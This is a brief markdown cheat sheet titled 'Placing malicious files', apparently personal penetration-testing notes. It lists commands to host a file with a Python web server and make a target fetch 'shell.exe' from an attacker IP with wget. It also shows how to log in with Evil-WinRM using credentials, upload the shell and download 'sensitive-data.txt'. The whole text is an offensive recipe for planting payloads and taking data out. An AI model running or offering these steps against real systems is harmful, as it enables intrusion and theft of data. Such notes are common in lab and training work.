# Placing malicious files 

## Python server
From the attacking device:
```sh
python3 -m http.server
```

From the target:
```sh
wget http://10.10.10.10:8000/shell.exe -O shell.exe
```

## Evil-WinRM
From the attacking device:
```sh
evil-winrm -i 10.10.10.11 -u MyUsername -p MyPassword
```

From the target:
```sh
upload shell.exe
download sensitive-data.txt
```
